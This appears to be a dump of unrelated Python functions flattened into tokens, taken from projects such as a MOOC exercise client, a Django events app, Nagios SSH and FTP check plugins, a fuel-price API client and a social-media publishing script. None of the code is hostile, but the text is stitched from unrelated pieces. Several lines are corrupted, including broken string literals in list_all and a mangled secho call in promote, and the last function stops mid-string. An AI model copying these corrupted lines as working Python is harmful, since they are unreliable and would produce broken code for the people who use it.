def _start_again ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the_answer = self . _get_text_answer ( ) return "{0} The correct answer was {1}. Please start a new game." . format ( message , the_answer )
def create ( self , server ) : return server . post ( 'challenge_admin' , self . as_payload ( ) , replacements = { 'slug' : self . slug } )
def update ( self , server ) : return server . put ( 'challenge_admin' , self . as_payload ( ) , replacements = { 'slug' : self . slug } )
def exists ( self , server ) : try : server . get ( 'challenge' , replacements = { 'slug' : self . slug } ) except Exception : return False return True
def axesfontsize ( ax , fontsize ) : items = ( [ ax . title , ax . xaxis . label , ax . yaxis . label ] + ax . get_xticklabels ( ) + ax . get_yticklabels ( ) ) for item in items : item . set_fontsize ( fontsize )
def less_labels ( ax , x_fraction = 0.5 , y_fraction = 0.5 ) : nbins = _np . size ( ax . get_xticklabels ( ) ) ax . locator_params ( nbins = _np . floor ( nbins * x_fraction ) , axis = 'x' ) nbins = _np . size ( ax . get_yticklabels ( ) ) ax . locator_params ( nbins = _np . floor ( nbins * y_fraction ) , axis = 'y' )
def send_zip ( self , exercise , file , params ) : resp = self . post ( exercise . return_url , params = params , files = { "submission[file]" : ( 'submission.zip' , file ) } , data = { "commit" : "Submit" } ) return self . _to_json ( resp )
def ancestors ( self ) : ancestors = set ( [ ] ) self . _depth_ascend ( self , ancestors ) try : ancestors . remove ( self ) except KeyError : # we weren't ancestor of ourself, that's ok pass return list ( ancestors )
def descendents ( self ) : visited = set ( [ ] ) self . _depth_descend ( self , visited ) try : visited . remove ( self ) except KeyError : # we weren't descendent of ourself, that's ok pass return list ( visited )
def chisq_red ( self ) : if self . _chisq_red is None : self . _chisq_red = chisquare ( self . y_unweighted . transpose ( ) , _np . dot ( self . X_unweighted , self . beta ) , self . y_error , ddof = 3 , verbose = False ) return self . _chisq_red
def create ( self , server ) : if len ( self . geometries ) == 0 : raise Exception ( 'no geometries' ) return server . post ( 'task_admin' , self . as_payload ( ) , replacements = { 'slug' : self . __challenge__ . slug , 'identifier' : self . identifier } )
def update ( self , server ) : return server . put ( 'task_admin' , self . as_payload ( ) , replacements = { 'slug' : self . __challenge__ . slug , 'identifier' : self . identifier } )
def from_server ( cls , server , slug , identifier ) : task = server . get ( 'task' , replacements = { 'slug' : slug , 'identifier' : identifier } ) return cls ( * * task )
def formatter ( color , s ) : if no_coloring : return s return "{begin}{s}{reset}" . format ( begin = color , s = s , reset = Colors . RESET )
def _setVirtualEnv ( ) : try : activate = options . virtualenv . activate_cmd except AttributeError : activate = None if activate is None : virtualenv = path ( os . environ . get ( 'VIRTUAL_ENV' , '' ) ) if not virtualenv : virtualenv = options . paved . cwd else : virtualenv = path ( virtualenv ) activate = virtualenv / 'bin' / 'activate' if activate . exists ( ) : info ( 'Using default virtualenv at %s' % activate ) options . setdotted ( 'virtualenv.activate_cmd' , 'source %s' % activate )
def pip_install ( * args ) : download_cache = ( '--download-cache=%s ' % options . paved . pip . download_cache ) if options . paved . pip . download_cache else '' shv ( 'pip install %s%s' % ( download_cache , ' ' . join ( args ) ) )
def _put_resource ( self , url , body ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = WhenIWork_DAO ( ) . putURL ( url , headers , json . dumps ( body ) ) if not ( response . status == 200 or response . status == 201 or response . status == 204 ) : raise DataFailureException ( url , response . status , response . data ) return json . loads ( response . data )
def _post_resource ( self , url , body ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = WhenIWork_DAO ( ) . postURL ( url , headers , json . dumps ( body ) ) if not ( response . status == 200 or response . status == 204 ) : raise DataFailureException ( url , response . status , response . data ) return json . loads ( response . data )
def _delete_resource ( self , url ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = WhenIWork_DAO ( ) . deleteURL ( url , headers ) if not ( response . status == 200 or response . status == 201 or response . status == 204 ) : raise DataFailureException ( url , response . status , response . data ) return json . loads ( response . data )
def all_comments ( self ) : ctype = ContentType . objects . get ( app_label__exact = "happenings" , model__exact = 'event' ) update_ctype = ContentType . objects . get ( app_label__exact = "happenings" , model__exact = 'update' ) update_ids = self . update_set . values_list ( 'id' , flat = True ) return Comment . objects . filter ( Q ( content_type = ctype . id , object_pk = self . id ) | Q ( content_type = update_ctype . id , object_pk__in = update_ids ) )
def get_all_images ( self ) : self_imgs = self . image_set . all ( ) update_ids = self . update_set . values_list ( 'id' , flat = True ) u_images = UpdateImage . objects . filter ( update__id__in = update_ids ) return list ( chain ( self_imgs , u_images ) )
def get_all_images_count ( self ) : self_imgs = self . image_set . count ( ) update_ids = self . update_set . values_list ( 'id' , flat = True ) u_images = UpdateImage . objects . filter ( update__id__in = update_ids ) . count ( ) count = self_imgs + u_images return count
def repack ( self ) : items = self . grouped_filter ( ) . order_by ( 'rank' ) . select_for_update ( ) for count , item in enumerate ( items ) : item . rank = count + 1 item . save ( rerank = False )
def selected_course ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : course = Course . get_selected ( ) return func ( course , * args , * * kwargs ) return inner
def selected_exercise ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : exercise = Exercise . get_selected ( ) return func ( exercise , * args , * * kwargs ) return inner
def false_exit ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : ret = func ( * args , * * kwargs ) if ret is False : if "TMC_TESTING" in os . environ : raise TMCExit ( ) else : sys . exit ( - 1 ) return ret return inner
def configure ( server = None , username = None , password = None , tid = None , auto = False ) : if not server and not username and not password and not tid : if Config . has ( ) : if not yn_prompt ( "Override old configuration" , False ) : return False reset_db ( ) if not server : while True : server = input ( "Server url [https://tmc.mooc.fi/mooc/]: " ) . strip ( ) if len ( server ) == 0 : server = "https://tmc.mooc.fi/mooc/" if not server . endswith ( '/' ) : server += '/' if not ( server . startswith ( "http://" ) or server . startswith ( "https://" ) ) : ret = custom_prompt ( "Server should start with http:// or https://\n" + "R: Retry, H: Assume http://, S: Assume https://" , [ "r" , "h" , "s" ] , "r" ) if ret == "r" : continue # Strip previous schema if "://" in server : server = server . split ( "://" ) [ 1 ] if ret == "h" : server = "http://" + server elif ret == "s" : server = "https://" + server break print ( "Using URL: '{0}'" . format ( server ) ) while True : if not username : username = input ( "Username: " ) if not password : password = getpass ( "Password: " ) # wow, such security token = b64encode ( bytes ( "{0}:{1}" . format ( username , password ) , encoding = 'utf-8' ) ) . decode ( "utf-8" ) try : api . configure ( url = server , token = token , test = True ) except APIError as e : print ( e ) if auto is False and yn_prompt ( "Retry authentication" ) : username = password = None continue return False break if tid : select ( course = True , tid = tid , auto = auto ) else : select ( course = True )
def download ( course , tid = None , dl_all = False , force = False , upgradejava = False , update = False ) : def dl ( id ) : download_exercise ( Exercise . get ( Exercise . tid == id ) , force = force , update_java = upgradejava , update = update ) if dl_all : for exercise in list ( course . exercises ) : dl ( exercise . tid ) elif tid is not None : dl ( int ( tid ) ) else : for exercise in list ( course . exercises ) : if not exercise . is_completed : dl ( exercise . tid ) else : exercise . update_downloaded ( )
def skip ( course , num = 1 ) : sel = None try : sel = Exercise . get_selected ( ) if sel . course . tid != course . tid : sel = None except NoExerciseSelected : pass if sel is None : sel = course . exercises . first ( ) else : try : sel = Exercise . get ( Exercise . id == sel . id + num ) except peewee . DoesNotExist : print ( "There are no more exercises in this course." ) return False sel . set_select ( ) list_all ( single = sel )
def run ( exercise , command ) : Popen ( [ 'nohup' , command , exercise . path ( ) ] , stdout = DEVNULL , stderr = DEVNULL )
def select ( course = False , tid = None , auto = False ) : if course : update ( course = True ) course = None try : course = Course . get_selected ( ) except NoCourseSelected : pass ret = { } if not tid : ret = Menu . launch ( "Select a course" , Course . select ( ) . execute ( ) , course ) else : ret [ "item" ] = Course . get ( Course . tid == tid ) if "item" in ret : ret [ "item" ] . set_select ( ) update ( ) if ret [ "item" ] . path == "" : select_a_path ( auto = auto ) # Selects the first exercise in this course skip ( ) return else : print ( "You can select the course with `tmc select --course`" ) return else : selected = None try : selected = Exercise . get_selected ( ) except NoExerciseSelected : pass ret = { } if not tid : ret = Menu . launch ( "Select an exercise" , Course . get_selected ( ) . exercises , selected ) else : ret [ "item" ] = Exercise . byid ( tid ) if "item" in ret : ret [ "item" ] . set_select ( ) print ( "Selected {}" . format ( ret [ "item" ] ) )
def submit ( course , tid = None , pastebin = False , review = False ) : if tid is not None : return submit_exercise ( Exercise . byid ( tid ) , pastebin = pastebin , request_review = review ) else : sel = Exercise . get_selected ( ) if not sel : raise NoExerciseSelected ( ) return submit_exercise ( sel , pastebin = pastebin , request_review = review )
def paste ( tid = None , review = False ) : submit ( pastebin = True , tid = tid , review = False )
def list_all ( course , single = None ) : def bs ( val ) : return "" i  v l e se " " def bc ( val ) : return as_success ( "")  i  v l e se a _error("  ")  def format_line ( exercise ) : return "{0}  {1}  {2}  {3}  {4}".format( e xercis e .tid,    bs ( exercise . is_selected ) , bc ( exercise . is_downloaded ) , bc ( exercise . is_completed ) , exercise . menuname ( ) ) print ( "ID{0} S  D  C  Name".format(    ( len ( str ( course . exercises [ 0 ] . tid ) ) - 1 ) * " " ) ) if single : print ( format_line ( single ) ) return for exercise in course . exercises : # ToDo: use a pager print ( format_line ( exercise ) )
def update ( course = False ) : if course : with Spinner . context ( msg = "Updated course metadata." , waitmsg = "Updating course metadata." ) : for course in api . get_courses ( ) : old = None try : old = Course . get ( Course . tid == course [ "id" ] ) except peewee . DoesNotExist : old = None if old : old . details_url = course [ "details_url" ] old . save ( ) continue Course . create ( tid = course [ "id" ] , name = course [ "name" ] , details_url = course [ "details_url" ] ) else : selected = Course . get_selected ( ) # with Spinner.context(msg="Updated exercise metadata.", #                     waitmsg="Updating exercise metadata."): print ( "Updating exercise data." ) for exercise in api . get_exercises ( selected ) : old = None try : old = Exercise . byid ( exercise [ "id" ] ) except peewee . DoesNotExist : old = None if old is not None : old . name = exercise [ "name" ] old . course = selected . id old . is_attempted = exercise [ "attempted" ] old . is_completed = exercise [ "completed" ] old . deadline = exercise . get ( "deadline" ) old . is_downloaded = os . path . isdir ( old . path ( ) ) old . return_url = exercise [ "return_url" ] old . zip_url = exercise [ "zip_url" ] old . submissions_url = exercise [ "exercise_submissions_url" ] old . save ( ) download_exercise ( old , update = True ) else : ex = Exercise . create ( tid = exercise [ "id" ] , name = exercise [ "name" ] , course = selected . id , is_attempted = exercise [ "attempted" ] , is_completed = exercise [ "completed" ] , deadline = exercise . get ( "deadline" ) , return_url = exercise [ "return_url" ] , zip_url = exercise [ "zip_url" ] , submissions_url = exercise [ ( "exercise_" "submissions_" "url" ) ] ) ex . is_downloaded = os . path . isdir ( ex . path ( ) ) ex . save ( )
def determine_type ( x ) : types = ( int , float , str ) _type = filter ( lambda a : is_type ( a , x ) , types ) [ 0 ] return _type ( x )
def dmap ( fn , record ) : values = ( fn ( v ) for k , v in record . items ( ) ) return dict ( itertools . izip ( record , values ) )
def apply_types ( use_types , guess_type , line ) : new_line = { } for k , v in line . items ( ) : if use_types . has_key ( k ) : new_line [ k ] = force_type ( use_types [ k ] , v ) elif guess_type : new_line [ k ] = determine_type ( v ) else : new_line [ k ] = v return new_line
def format_to_csv ( filename , skiprows = 0 , delimiter = "" ) : if not delimiter : delimiter = "\t" input_file = open ( filename , "r" ) if skiprows : [ input_file . readline ( ) for _ in range ( skiprows ) ] new_filename = os . path . splitext ( filename ) [ 0 ] + ".csv" output_file = open ( new_filename , "w" ) header = input_file . readline ( ) . split ( ) reader = csv . DictReader ( input_file , fieldnames = header , delimiter = delimiter ) writer = csv . DictWriter ( output_file , fieldnames = header , delimiter = "," ) # Write header writer . writerow ( dict ( ( x , x ) for x in header ) ) # Write rows for line in reader : if None in line : del line [ None ] writer . writerow ( line ) input_file . close ( ) output_file . close ( ) print "Saved %s." % new_filename
def sigma_prime ( self ) : return _np . sqrt ( self . emit / self . beta ( self . E ) )
def n_p ( self ) : return 2 * _sltr . GeV2joule ( self . E ) * _spc . epsilon_0 / ( self . beta * _spc . elementary_charge ) ** 2
def main ( target , label ) : check_environment ( target , label ) click . secho ( 'Fetching tags from the upstream ...' ) handler = TagHandler ( git . list_tags ( ) ) print_information ( handler , label ) tag = handler . yield_tag ( target , label ) confirm ( tag )
def check_environment ( target , label ) : if not git . exists ( ) : click . secho ( 'You must have git installed to use yld.' , fg = 'red' ) sys . exit ( 1 ) if not os . path . isdir ( '.git' ) : click . secho ( 'You must cd into a git repository to use yld.' , fg = 'red' ) sys . exit ( 1 ) if not git . is_committed ( ) : click . secho ( 'You must commit or stash your work before proceeding.' , fg = 'red' ) sys . exit ( 1 ) if target is None and label is None : click . secho ( 'You must specify either a target or a label.' , fg = 'red' ) sys . exit ( 1 )
def print_information ( handler , label ) : click . echo ( '=> Latest stable: {tag}' . format ( tag = click . style ( str ( handler . latest_stable or 'N/A' ) , fg = 'yellow' if handler . latest_stable else 'magenta' ) ) ) if label is not None : latest_revision = handler . latest_revision ( label ) click . echo ( '=> Latest relative revision ({label}): {tag}' . format ( label = click . style ( label , fg = 'blue' ) , tag = click . style ( str ( latest_revision or 'N/A' ) , fg = 'yellow' if latest_revision else 'magenta' ) ) )
def confirm ( tag ) : click . echo ( ) if click . confirm ( 'Do you want to create the tag {tag}?' . format ( tag = click . style ( str ( tag ) , fg = 'yellow' ) ) , default = True , abort = True ) : git . create_tag ( tag ) if click . confirm ( 'Do you want to push the tag {tag} into the upstream?' . format ( tag = click . style ( str ( tag ) , fg = 'yellow' ) ) , default = True ) : git . push_tag ( tag ) click . echo ( 'Done!' ) else : git . delete_tag ( tag ) click . echo ( 'Aborted!' )
def get_state ( self ) : return [ os . path . join ( dp , f ) for dp , _ , fn in os . walk ( self . dir ) for f in fn ]
def tick ( self ) : self . current += 1 if self . current == self . factor : sys . stdout . write ( '+' ) sys . stdout . flush ( ) self . current = 0
def pickle ( obj , filepath ) : arr = pkl . dumps ( obj , - 1 ) with open ( filepath , 'wb' ) as f : s = 0 while s < len ( arr ) : e = min ( s + blosc . MAX_BUFFERSIZE , len ( arr ) ) carr = blosc . compress ( arr [ s : e ] , typesize = 8 ) f . write ( carr ) s = e
def unpickle ( filepath ) : arr = [ ] with open ( filepath , 'rb' ) as f : carr = f . read ( blosc . MAX_BUFFERSIZE ) while len ( carr ) > 0 : arr . append ( blosc . decompress ( carr ) ) carr = f . read ( blosc . MAX_BUFFERSIZE ) return pkl . loads ( b"" . join ( arr ) )
def contact ( request ) : form = ContactForm ( request . POST or None ) if form . is_valid ( ) : subject = form . cleaned_data [ 'subject' ] message = form . cleaned_data [ 'message' ] sender = form . cleaned_data [ 'sender' ] cc_myself = form . cleaned_data [ 'cc_myself' ] recipients = settings . CONTACTFORM_RECIPIENTS if cc_myself : recipients . append ( sender ) send_mail ( getattr ( settings , "CONTACTFORM_SUBJECT_PREFIX" , '' ) + subject , message , sender , recipients ) return render ( request , 'contactform/thanks.html' ) return render ( request , 'contactform/contact.html' , { 'form' : form } )
def write ( ) : click . echo ( "Fantastic. Let's get started. " ) title = click . prompt ( "What's the title?" ) # Make sure that title doesn't exist. url = slugify ( title ) url = click . prompt ( "What's the URL?" , default = url ) # Make sure that title doesn't exist. click . echo ( "Got it. Creating %s..." % url ) scaffold_piece ( title , url )
def scaffold ( ) : click . echo ( "A whole new site? Awesome." ) title = click . prompt ( "What's the title?" ) url = click . prompt ( "Great. What's url? http://" ) # Make sure that title doesn't exist. click . echo ( "Got it. Creating %s..." % url )
def promote ( ) : if "BUFFER_ACCESS_TOKEN" not in os . environ : warn ( "Missing BUFFER_ACCESS_TOKEN." ) echo ( "To publish to social medial, you'll need an access token for buffer." ) echo ( "The simplest way to get one is to create a new app here: https://buffer.com/developers/apps" ) echo ( "The token you want is the 'Access Token'" ) echo ( "Once you have it, make it available to ink by putting it in the environment." ) # GET https://api.bufferapp.com/1/profiles.json echo ( "Verifying available profiles on buffer" ) profiles = buffer_get ( "/1/profiles.json" ) for p in profiles : supported_profile = False if p [ "formatted_service" ] . lower ( ) == "facebook" or p [ "formatted_service" ] . lower ( ) == "facebook page" : facebook_profiles . append ( p ) supported_profile = True elif p [ "formatted_service" ] . lower ( ) == "twitter" : twitter_profiles . append ( p ) supported_profile = True if supported_profile : click . secho ( u"  %s: %s" % ( [ " f ormatted_service"],   p " f ormatted_username"]) ,   f =" g reen")  echo ( "Checking publication status..." ) site_json_filename = os . path . join ( ROOT_DIR , BUILD_DIR , "static" , "private.json" ) with open ( site_json_filename , "r" ) as site_json : site = load ( site_json ) echo ( 'Reviewing social posts...' ) posts = { } unpublished_posts = [ ] for dirpath , dirnames , filenames in os . walk ( os . path . join ( ROOT_DIR , "posts" ) , topdown = False ) : for filename in filenames : if "piece.md" in filename : if exists ( dirpath , "social.yml" ) and exists ( dirpath , "meta.yml" ) : with open ( os . path . join ( dirpath , "social.yml" ) ) as f : social = load ( f ) with open ( os . path . join ( dirpath , "meta.yml" ) ) as f : meta = load ( f ) if "url" in meta : site_json_entry = None for sp in site [ "posts" ] : if meta [ "url" ] == sp [ "url" ] : site_json_entry = sp break posts [ meta [ "url" ] ] = { "meta" : meta , "social" : social , "dirpath" : dirpath , "site" : site_json_entry , } if "published" not in social or social [ "published" ] is not True : unpublished_posts . append ( meta [ "url" ] ) else : warn ( "No url found for %s" % dirpath . replace ( ROOT_DIR ) ) automark_set = False automark = None for u in unpublished_posts : post = posts [ u ] if "posts" in post [ "social" ] and post [ "social" ] [ "posts" ] and len ( post [ "social" ] [ "posts" ] ) > 0 : facebook_posts = [ ] twitter_posts = [ ] mark_as_published = False has_valid_post = False for p in post [ "social" ] [ "posts" ] : try : if len ( p . keys ( ) ) != 1 : error ( "Something's formatted wrong in %s's social.yml" % u ) break if p . keys ( ) [ 0 ] == "facebook" : facebook_posts . append ( p [ "facebook" ] ) if post_in_future ( p [ "facebook" ] , post ) : has_valid_post = True elif p . keys ( ) [ 0 ] == "twitter" : if post_in_future ( p [ "twitter" ] , post ) : has_valid_post = True twitter_posts . append ( p [ "twitter" ] ) else : warn ( "Unknown post type: %s.  Skipping." % p . keys ( ) [ 0 ] ) except : error ( "Error parsing social.yml for \"%s\"" % post [ "meta" ] [ "title" ] ) import traceback traceback . print_exc ( ) if not has_valid_post : if automark : mark_as_published = True else : warn ( '"%s" hasn\'t been published, but all posts are in the past.' % post [ "meta" ] [ "title" ] ) if click . confirm ( "Mark as published?" ) : mark_as_published = True if not automark_set : if click . confirm ( "Mark all other similar posts as published?" ) : automark = True automark_set = True else : echo ( '\n"%s" hasn\'t been published to social media.' % post [ "meta" ] [ "title" ] ) if len ( facebook_posts ) > 0 : echo ( "  Facebook:" ) for p in facebook_posts : if ( len ( p [ "content" ] ) > 40 ) : truncated_content = "%s..." % p [ "content" ] [ : 40 ] else : truncated_content = p [ "content" ] if post_in_future ( p , post ) : echo ( "   - %s:  \"%s\"" % ( publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) ) else : warn ( "   - %s:  \"%s\" skipping (past)" % ( publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) ) echo ( "  Twitter:" ) if len ( twitter_posts ) > 0 : for p in twitter_posts : if ( len ( p [ "content" ] ) > 40 ) : truncated_content = "%s..." % p [ "content" ] [ : 40 ] else : truncated_content = p [ "content" ] if post_in_future ( p , post ) : echo ( "   - %s:  \"%s\"" % ( publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) ) else : warn ( "   - %s:  \"%s\" skipping (past)" % ( publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) ) if click . confirm ( click . style ( "  Publish now?" , fg = "green" ) ) : mark_as_published = True echo ( "  Publishing..." ) for p in facebook_posts : if post_in_future ( p , post ) : publish_facebook ( p , post ) if ( len ( p [ "content" ] ) > 40 ) : truncated_content = "%s..." % p [ "content" ] [ : 40 ] else : truncated_content = p [ "content" ] click . secho ( u"    Facebook %s:  \"%s\"" % (  publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) , fg = "green" ) for p in twitter_posts : if post_in_future ( p , post ) : publish_twitter ( p , post ) if ( len ( p [ "content" ] ) > 40 ) : truncated_content = "%s..." % p [ "content" ] [ : 40 ] else : truncated_content = p [ "content" ] click . secho ( u"    Twitter %s:  \"%s\"" % (  publish_datetime ( p , post ) . strftime ( "%c" ) , truncated_content , ) , fg = "green" ) echo ( "  Published." ) # Save as published. if mark_as_published or automark : post [ "social" ] [ "published" ] = True with open ( os . path . join ( post [ "dirpath" ] , "social.yml" ) , "w" ) as f : dump ( post [ "social" ] , f , default_flow_style = False , width = 1000 ) if click . confirm ( "Publish your entire backlog to buffer?" ) : print ( "dope" )
def get_branches ( self ) : return [ self . _sanitize ( branch ) for branch in self . _git . branch ( color = "never" ) . splitlines ( ) ]
def get_current_branch ( self ) : return next ( ( self . _sanitize ( branch ) for branch in self . _git . branch ( color = "never" ) . splitlines ( ) if branch . startswith ( '*' ) ) , None )
def create_patch ( self , from_tag , to_tag ) : return str ( self . _git . diff ( '{}..{}' . format ( from_tag , to_tag ) , _tty_out = False ) )
def get_fuel_prices ( self ) -> GetFuelPricesResponse : response = requests . get ( '{}/prices' . format ( API_URL_BASE ) , headers = self . _get_headers ( ) , timeout = self . _timeout , ) if not response . ok : raise FuelCheckError . create ( response ) return GetFuelPricesResponse . deserialize ( response . json ( ) )
def get_fuel_prices_for_station ( self , station : int ) -> List [ Price ] : response = requests . get ( '{}/prices/station/{}' . format ( API_URL_BASE , station ) , headers = self . _get_headers ( ) , timeout = self . _timeout , ) if not response . ok : raise FuelCheckError . create ( response ) data = response . json ( ) return [ Price . deserialize ( data ) for data in data [ 'prices' ] ]
def get_fuel_prices_within_radius ( self , latitude : float , longitude : float , radius : int , fuel_type : str , brands : Optional [ List [ str ] ] = None ) -> List [ StationPrice ] : if brands is None : brands = [ ] response = requests . post ( '{}/prices/nearby' . format ( API_URL_BASE ) , json = { 'fueltype' : fuel_type , 'latitude' : latitude , 'longitude' : longitude , 'radius' : radius , 'brand' : brands , } , headers = self . _get_headers ( ) , timeout = self . _timeout , ) if not response . ok : raise FuelCheckError . create ( response ) data = response . json ( ) stations = { station [ 'code' ] : Station . deserialize ( station ) for station in data [ 'stations' ] } station_prices = [ ] # type: List[StationPrice] for serialized_price in data [ 'prices' ] : price = Price . deserialize ( serialized_price ) station_prices . append ( StationPrice ( price = price , station = stations [ price . station_code ] ) ) return station_prices
def get_fuel_price_trends ( self , latitude : float , longitude : float , fuel_types : List [ str ] ) -> PriceTrends : response = requests . post ( '{}/prices/trends/' . format ( API_URL_BASE ) , json = { 'location' : { 'latitude' : latitude , 'longitude' : longitude , } , 'fueltypes' : [ { 'code' : type } for type in fuel_types ] , } , headers = self . _get_headers ( ) , timeout = self . _timeout , ) if not response . ok : raise FuelCheckError . create ( response ) data = response . json ( ) return PriceTrends ( variances = [ Variance . deserialize ( variance ) for variance in data [ 'Variances' ] ] , average_prices = [ AveragePrice . deserialize ( avg_price ) for avg_price in data [ 'AveragePrices' ] ] )
def pre ( self , command , output_dir , vars ) : # import pdb;pdb.set_trace() vars [ 'license_name' ] = 'Apache' vars [ 'year' ] = time . strftime ( '%Y' , time . localtime ( ) )
def _addRoute ( self , f , matcher ) : self . _routes . append ( ( f . func_name , f , matcher ) )
def _tempfile ( filename ) : return tempfile . NamedTemporaryFile ( mode = 'w' , dir = os . path . dirname ( filename ) , prefix = os . path . basename ( filename ) , suffix = os . fsencode ( '.tmp' ) , delete = False )
def atomic_write ( filename ) : f = _tempfile ( os . fsencode ( filename ) ) try : yield f finally : f . close ( ) # replace the original file with the new temp file (atomic on success) os . replace ( f . name , filename )
def get_item ( filename , uuid ) : with open ( os . fsencode ( str ( filename ) ) , "r" ) as f : data = json . load ( f ) results = [ i for i in data if i [ "uuid" ] == str ( uuid ) ] if results : return results return None
def set_item ( filename , item ) : with atomic_write ( os . fsencode ( str ( filename ) ) ) as temp_file : with open ( os . fsencode ( str ( filename ) ) ) as products_file : # load the JSON data into memory products_data = json . load ( products_file ) # check if UUID already exists uuid_list = [ i for i in filter ( lambda z : z [ "uuid" ] == str ( item [ "uuid" ] ) , products_data ) ] if len ( uuid_list ) == 0 : # add the new item to the JSON file products_data . append ( item ) # save the new JSON to the temp file json . dump ( products_data , temp_file ) return True return None
def update_item ( filename , item , uuid ) : with atomic_write ( os . fsencode ( str ( filename ) ) ) as temp_file : with open ( os . fsencode ( str ( filename ) ) ) as products_file : # load the JSON data into memory products_data = json . load ( products_file ) # apply modifications to the JSON data wrt UUID # TODO: handle this in a neat way if 'products' in products_data [ - 1 ] : # handle orders object [ products_data [ i ] [ "products" ] [ 0 ] . update ( item ) for ( i , j ) in enumerate ( products_data ) if j [ "uuid" ] == str ( uuid ) ] else : # handle products object [ products_data [ i ] . update ( item ) for ( i , j ) in enumerate ( products_data ) if j [ "uuid" ] == str ( uuid ) ] # save the modified JSON data into the temp file json . dump ( products_data , temp_file ) return True
def main ( ) : plugin = Register ( ) if plugin . args . option == 'command' : plugin . command_handle ( ) else : plugin . unknown ( "Unknown actions." )
def command_handle ( self ) : self . __results = self . execute ( self . args . command ) self . close ( ) self . logger . debug ( "results: {}" . format ( self . __results ) ) if not self . __results : self . unknown ( "{} return nothing." . format ( self . args . command ) ) if len ( self . __results ) != 1 : self . unknown ( "{} return more than one number." . format ( self . args . command ) ) self . __result = int ( self . __results [ 0 ] ) self . logger . debug ( "result: {}" . format ( self . __result ) ) if not isinstance ( self . __result , ( int , long ) ) : self . unknown ( "{} didn't return single number." . format ( self . args . command ) ) status = self . ok # Compare the vlaue. if self . __result > self . args . warning : status = self . warning if self . __result > self . args . critical : status = self . critical # Output self . shortoutput = "{0} return {1}." . format ( self . args . command , self . __result ) [ self . longoutput . append ( line ) for line in self . __results if self . __results ] self . perfdata . append ( "{command}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . __result , command = self . args . command ) ) # Return status with message to Nagios. status ( self . output ( long_output_limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def execute ( self , command , timeout = None ) : try : self . channel = self . ssh . get_transport ( ) . open_session ( ) except paramiko . SSHException as e : self . unknown ( "Create channel error: %s" % e ) try : self . channel . settimeout ( self . args . timeout if not timeout else timeout ) except socket . timeout as e : self . unknown ( "Settimeout for channel error: %s" % e ) try : self . logger . debug ( "command: {}" . format ( command ) ) self . channel . exec_command ( command ) except paramiko . SSHException as e : self . unknown ( "Execute command error: %s" % e ) try : self . stdin = self . channel . makefile ( 'wb' , - 1 ) self . stderr = map ( string . strip , self . channel . makefile_stderr ( 'rb' , - 1 ) . readlines ( ) ) self . stdout = map ( string . strip , self . channel . makefile ( 'rb' , - 1 ) . readlines ( ) ) except Exception as e : self . unknown ( "Get result error: %s" % e ) try : self . status = self . channel . recv_exit_status ( ) except paramiko . SSHException as e : self . unknown ( "Get return code error: %s" % e ) else : if self . status != 0 : self . unknown ( "Return code: %d , stderr: %s" % ( self . status , self . errors ) ) else : return self . stdout finally : self . logger . debug ( "Execute command finish." )
def close ( self ) : try : self . ssh . close ( ) self . logger . debug ( "close connect succeed." ) except paramiko . SSHException as e : self . unknown ( "close connect error: %s" % e )
def slinky ( filename , seconds_available , bucket_name , aws_key , aws_secret ) : if not os . environ . get ( 'AWS_ACCESS_KEY_ID' ) and os . environ . get ( 'AWS_SECRET_ACCESS_KEY' ) : print 'Need to set environment variables for AWS access and create a slinky bucket.' exit ( ) print create_temp_s3_link ( filename , seconds_available , bucket_name )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'filenumber' : plugin . filenumber_handle ( ) else : plugin . unknown ( "Unknown actions." )
def filenumber_handle ( self ) : self . __results = [ ] self . __dirs = [ ] self . __files = [ ] self . __ftp = self . connect ( ) self . __ftp . dir ( self . args . path , self . __results . append ) self . logger . debug ( "dir results: {}" . format ( self . __results ) ) self . quit ( ) status = self . ok for data in self . __results : if "<DIR>" in data : self . __dirs . append ( str ( data . split ( ) [ 3 ] ) ) else : self . __files . append ( str ( data . split ( ) [ 2 ] ) ) self . __result = len ( self . __files ) self . logger . debug ( "result: {}" . format ( self . __result ) ) # Compare the vlaue. if self . __result > self . args . warning : status = self . warning if self . __result > self . args . critical : status = self . critical # Output self . shortoutput = "Found {0} files in {1}." . format ( self . __result , self . args . path ) [ self . longoutput . append ( line ) for line in self . __results if self . __results ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . __result , path = self . args . path ) ) self . logger . debug ( "Return status and output." ) status ( self . output ( ) )
def register_json ( self , data ) : j = json . loads ( data ) self . last_data_timestamp = datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) . isoformat ( ) try : for v in j : # prepare the sensor entry container self . data [ v [ self . id_key ] ] = { } # add the mandatory entries self . data [ v [ self . id_key ] ] [ self . id_key ] = v [ self . id_key ] self . data [ v [ self . id_key ] ] [ self . value_key ] = v [ self . value_key ] # add the optional well known entries if provided if self . unit_key in v : self . data [ v [ self . id_key ] ] [ self . unit_key ] = v [ self . unit_key ] if self . threshold_key in v : self . data [ v [ self . id_key ] ] [ self . threshold_key ] = v [ self . threshold_key ] # add any further entries found for k in self . other_keys : if k in v : self . data [ v [ self . id_key ] ] [ k ] = v [ k ] # add the custom sensor time if self . sensor_time_key in v : self . data [ v [ self . sensor_time_key ] ] [ self . sensor_time_key ] = v [ self . sensor_time_key ] # last: add the time the data was received (overwriting any # not properly defined timestamp that was already there) self . data [ v [ self . id_key ] ] [ self . time_key ] = self . last_data_timestamp except KeyError as e : print ( "The main key was not found on the serial input line: " + str ( e ) ) except ValueError as e : print ( "No valid JSON string received. Waiting for the next turn." ) print ( "The 